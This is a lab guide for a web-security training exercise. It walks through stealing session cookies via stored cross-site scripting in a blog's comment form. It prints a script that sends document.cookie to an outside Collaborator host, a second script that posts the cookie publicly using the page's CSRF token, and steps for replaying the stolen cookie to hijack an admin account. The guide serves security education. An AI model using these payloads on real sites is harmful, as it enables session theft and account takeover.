# 🛡️ Lab Guide: Exploiting Cross-Site Scripting to Steal Cookies

This guide walks you through exploiting a **Cross-Site Scripting (XSS)** vulnerability in a blog comment system to steal a victim’s session cookie using **Burp Suite Professional**. You’ll use the Burp Collaborator to capture the cookie and hijack the admin’s session. Let’s dive in! 🚀

---

## 📋 Objective
Exploit an XSS vulnerability to make a victim’s browser send their session cookie to a Burp Collaborator server, then use the stolen cookie to hijack the admin’s session.

---

## 🛠️ Tools Needed
- **Burp Suite Professional** (with Burp’s browser and Collaborator)
- Basic understanding of XSS, HTTP requests, and session cookies

---

## 📝 Step-by-Step Instructions

### 1️⃣ Set Up Burp Collaborator
- Open **Burp Suite Professional** and navigate to the **Collaborator** tab.
- Click **Copy to clipboard** to copy a unique **Burp Collaborator subdomain** (e.g., `xyz.burpcollaborator.net`).

### 2️⃣ Craft the XSS Payload
- In **Burp’s browser**, navigate to the blog page (e.g., `https://YOUR-LAB-ID.web-security-academy.net/post?postId=7`) and access the comment submission form.
- Submit the following XSS payload in the comment field, replacing `BURP-COLLABORATOR-SUBDOMAIN` with your copied subdomain:
  ```html
  <script>
  fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
      method: 'POST',
      mode: 'no-cors',
      body: document.cookie
  });
  </script>
  ```
- **Note**: This script triggers a POST request containing the viewer’s session cookie to your Collaborator subdomain when the comment is viewed.

### 3️⃣ Capture the Victim’s Cookie
- Return to the **Collaborator** tab in Burp Suite and click **Poll now**.
- Wait a few seconds and check for an HTTP interaction. If none appears, poll again.
- **Observation**: The POST body contains the victim’s session cookie (e.g., `session=jtVtDHLJMRENXeL1K7YyNTizEp3jOKLf`).

### 4️⃣ Hijack the Admin Session
- In **Burp’s browser**, navigate to the blog’s main page (e.g., `https://YOUR-LAB-ID.web-security-academy.net`).
- Use **Burp Proxy** or **Repeater** to intercept a request (e.g., GET `/my-account`).
- Replace the `Cookie` header with the stolen session cookie:
  ```
  Cookie: session=jtVtDHLJMRENXeL1K7YyNTizEp3jOKLf
  ```
- Submit the request and verify that you’ve accessed the admin’s account page.
- **Observation**: The response loads the admin user’s account page, confirming successful session hijacking.

### 5️⃣ Alternative Approach (Less Subtle)
- Instead of using Burp Collaborator, you could modify the comment to post the cookie publicly:
  ```javascript
  window.addEventListener('DOMContentLoaded', function(){
      var token = document.getElementsByName('csrf')[0].value;
      var data = new FormData();
      data.append('csrf', token);
      data.append('postId', 7);
      data.append('comment', document.cookie);
      data.append('name', 'victim');
      data.append('email', 'mohamed@gmail.com');
      data.append('website', 'https://mohamed.com');
      fetch('/post/comment', {
          method: 'POST',
          mode: 'no-cors',
          body: data
      });
  });
  ```